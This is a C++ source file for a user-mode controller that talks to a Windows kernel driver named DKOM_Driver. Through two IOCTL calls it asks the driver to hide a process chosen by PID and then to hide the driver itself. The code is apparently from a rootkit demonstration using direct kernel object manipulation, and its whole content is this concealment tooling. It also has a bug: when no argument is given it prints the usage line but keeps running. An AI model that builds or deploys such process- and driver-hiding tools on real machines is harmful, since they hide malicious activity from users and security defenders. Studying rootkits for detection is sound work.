// DKOM_DemoController.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <iostream>

// local includes
#include "..\DKOM_Demo\DKOM_DemoCommon.h"

int Error(const char* message) {
    std::cout << message << ". Error=" << GetLastError() << std::endl;
    return 1;
}

int main(int argc, const char* argv[])
{
    if (argc < 2) {
        std::cout << "Usage: DKOM_DemoController.exe pid" << std::endl;
    }

    /*
    * Attempt to reach the IRP_MJ_CREATE dispatch routine
    */
    HANDLE hDevice = CreateFile(L"\\\\.\\DKOM_Driver", GENERIC_WRITE,
        FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);

    if (hDevice == INVALID_HANDLE_VALUE)
        return Error("Failed to open device");

    /*
    * Create and populate a ProcessData structure
    */
    ProcessData data;
    data.pid = atoi(argv[1]);

    /*
    * Call DeviceIoControl and close the device handle afterwards
    */
    DWORD returned;
    BOOL success = DeviceIoControl(
        hDevice,
        IOCTL_DKOM_DEMO_HIDE_PROCESS,   // control code
        &data, sizeof(data),            // input buffer and length
        nullptr, 0,                     // output buffer and length
        &returned, nullptr);
    if (success)
        std::cout << "Process successfully hidden!" << std::endl;
    else
        Error("Process hiding failed");

    success = DeviceIoControl(
        hDevice,
        IOCTL_DKOM_DEMO_HIDE_DRIVER,   // control code
        NULL, NULL          ,          // input buffer and length
        nullptr, 0,                    // output buffer and length
        &returned, nullptr);
    if (success)
        std::cout << "Driver successfully hidden!" << std::endl;
    else
        Error("Driver hiding failed");

    CloseHandle(hDevice);

    return 0;
}
